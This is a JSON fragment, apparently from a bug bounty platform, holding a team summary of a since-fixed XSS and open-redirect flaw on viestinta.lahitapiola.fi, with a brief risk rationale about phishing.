":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":3306,"category":"team","content":"##Issue\n\nThe reporter found a simple XSS in viestinta.lahitapiola.fi but later discovered that the vulnerability also allowed open and unvalidated redirects. \n\n##Fix\n\nAn updated version of the application was issued to address the problem.\n\n##Reasoning\n\nAn XSS as such is not a huge issue from a risk perspective, although it poses a small risk for stealing of credentials. Open redirects allow for far more sophisticated attack vectors using mass phishing emails and a customized malicious login page.","can_view?":true,"can_edit?":false,"content_html":"\u003ch2 id=\"issue\"\u003eIssue\u003c/h2\u003e\n\n\u003cp\u003eThe reporter found a simple XSS in viestinta.lahitapiola.fi but later discovered that the vulnerability also allowed open and unvalidated redirects. \u003c/p\u003e\n\n\u003ch2 id=\"fix\"\u003eFix\u003c/h2\u003e\n\n\u003cp\u003eAn updated version of the application was issued to address the problem.\u003c/p\u003e\n\n\u003ch2 id=\"reasoning\"\u003eReasoning\u003c/h2\u003e\n\n\u003cp\u003eAn XSS as such is not a huge issue from a risk perspective, although it poses a small risk for stealing of credentials. Open redirects allow for far more sophisticated attack vectors using mass phishing emails and a customized malicious login page.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}